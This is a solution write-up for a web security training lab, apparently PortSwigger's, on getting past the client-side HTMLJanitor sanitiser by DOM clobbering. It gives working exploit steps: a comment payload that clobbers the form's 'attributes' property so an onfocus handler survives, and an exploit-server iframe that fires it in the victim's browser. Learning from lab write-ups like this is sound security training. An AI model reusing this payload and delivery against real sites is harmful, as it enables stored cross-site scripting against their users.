# Solution — Clobbering DOM attributes to bypass HTML filters

Reproducible steps, in order. Replace `<LAB>` with the lab host and `<EXPLOIT>`
with the exploit-server host shown by "Go to exploit server".

## 1. Recon: the filter is client-side

`GET <LAB>/post?postId=<n>` loads:

```html
<script src='/resources/js/htmlJanitor.js'></script>
<script src='/resources/js/loadCommentsWithHtmlJanitor.js'></script>
<script>loadComments('/post/comment')</script>
```

`loadCommentsWithHtmlJanitor.js` builds the sanitiser as

```js
let janitor = new HTMLJanitor({tags: {
    input: {name: true, type: true, value: true},
    form:  {id: true}, i: {}, b: {}, p: {}
}});
...
commentBodyPElement.innerHTML = janitor.clean(comment.body);
```

and `htmlJanitor.js` filters attributes with

```js
for (var a = 0; a < node.attributes.length; a += 1) {
  var attr = node.attributes[a];
  if (shouldRejectAttr(attr, allowedAttrs, node)) { node.removeAttribute(attr.name); ... }
}
```

Comments are stored raw — `GET <LAB>/post/comment?postId=<n>` returns the exact
submitted HTML as JSON, so nothing is filtered server-side.

## 2. Submit the clobbering comment

```
POST <LAB>/post/comment
csrf=<token>&postId=<n>&comment=<form id=x tabindex=0 onfocus=print()><input id=attributes>&name=xss&email=xss@example.com&website=
```

`<input id=attributes>` is a descendant of the form, so on the form node
`form.attributes` resolves through the named-property getter to the **input**,
not to the element's `NamedNodeMap`. `HTMLInputElement` has no `length`, the
loop condition `0 < undefined` is false, and the loop body never executes —
the form keeps `tabindex` and `onfocus`. The input's own `id` is removed later
when the input node is visited, but that happens after the parent was skipped.

Rendered (sanitised) result observed in Chrome:

```html
<p><form id="x" tabindex="0" onfocus="print()"><input></form></p>
```

## 3. Auto-execute in the victim's browser

Store this body on the exploit server (`responseFile=/exploit`,
`Content-Type: text/html`):

```html
<iframe src=<LAB>/post?postId=<n> onload="setTimeout(()=>this.src=this.src+'#x',500)"></iframe>
```

The delay matters: the comment is rendered by an XHR after page load, so the
`#x` fragment must be applied *after* the form exists. Assigning `iframe.src`
to the same URL plus a fragment is a same-document fragment navigation, which
focuses the `tabindex=0` form and fires `onfocus`.

Then submit with `formAction=DELIVER_TO_VICTIM`. The Academy bot queues
deliveries: the visit can arrive seconds later or a few minutes later.

## 4. Verify

* Exploit-server access log shows `GET /exploit/ 200` from
  `Mozilla/5.0 (Victim) ... Chrome/...`.
* The lab root flips to
  `<div class='widgetcontainer-lab-status is-solved'><p>Solved</p>` plus the
  "Congratulations, you solved the lab!" banner.

On the verified instance the visit happened at 19:56:13 UTC and the widget read
`is-solved` by 19:58:35 UTC.

## Notes

* Keep the vector byte-identical to the documented solution. Variants that add
  `alert()`, beacons or a popup delivery were executed by the victim (confirmed
  with beacon requests) but never flipped the widget — see `REPORT.md` §5.
* The exploit-server `ACCESS_LOG` action requires the `responseFile`,
  `responseHead` and `responseBody` fields and re-stores whatever body it is
  given — send the same body you want to keep.
* Once the lab is solved the header drops `#exploit-link`, so a re-run cannot
  rediscover the exploit server; the solver checks the baseline first.
